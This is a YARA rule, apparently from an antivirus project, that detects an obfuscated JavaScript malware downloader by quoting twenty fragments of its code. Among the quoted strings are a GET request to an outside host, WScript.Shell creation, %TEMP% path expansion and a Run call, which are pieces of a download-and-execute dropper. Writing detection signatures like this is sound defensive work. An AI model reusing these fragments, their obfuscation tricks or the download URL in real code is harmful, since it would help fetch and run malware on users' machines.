rule sig_20160427_674634a2f42bf3f0a1cca653a5cf63b2 {
  meta:
    description = "datamaliciousorder - file 20160427_674634a2f42bf3f0a1cca653a5cf63b2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4bd76b62e7c98107f45e2d072c278c2c3c7dd269437a2f7e55c2719542003811"

  strings:
    $s1  = "NrnliGxkpg[XipldFnfbh](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function UbdldFcenb() {return QrpzxGaxhs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tSiWldc" ascii
    $s3  = "function UbdldFcenb() {return QrpzxGaxhs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"tSiWldc" ascii
    $s4  = "function YefbuVvrie(MpzrrIzyim, WeutcLgjcf){XsamcMgile = XsamcMgile * 1; return MpzrrIzyim - WeutcLgjcf;};" fullword ascii
    $s5  = "var QrpzxGaxhs = function YaigbPwxnl() {return RynuqXhcju[TrqlfEyauh](\"WScript\"+\".Shell\");}(), ThneoCyxqa = 11;" fullword ascii
    $s6  = "var RynuqXhcju = this[\"WScript\"];" fullword ascii
    $s7  = "var QxreyEqwzn = new this[\"D\"+\"ate\"]();" fullword ascii
    $s8  = "function FmydlTrjyv(){return VvcmpDynrp + \"\";};" fullword ascii
    $s9  = "if (NrnliGxkpg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function LennwLdhls() {return ((AbfmvXmpfd == true) && (AbfmvXmpfd == JtstrPngkb)) ? 1 : XsamcMgile;};" fullword ascii
    $s11 = "TnupmZhjvc = true;" fullword ascii
    $s12 = "function UujarKtodp(){return TrqlfEyauh;};" fullword ascii
    $s13 = "function WnnixMghrv(YfamiWyjia) {var MbwliSosfb = (1, 2, 3, 4, 5, YfamiWyjia); return MbwliSosfb;};" fullword ascii
    $s14 = "function WtgtlDwqpc(KtyaoXhviq){QrpzxGaxhs[\"R\"+\"un\"](KtyaoXhviq, XsamcMgile, XsamcMgile);};" fullword ascii
    $s15 = "JtstrPngkb = true; " fullword ascii
    $s16 = "}while (YxoelDvaxe);" fullword ascii
    $s17 = "var TnupmZhjvc = false;" fullword ascii
    $s18 = "var JtstrPngkb = false;" fullword ascii
    $s19 = "function NvdvbIubhq(){return 23;};" fullword ascii
    $s20 = "function AhdgaOozxt()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}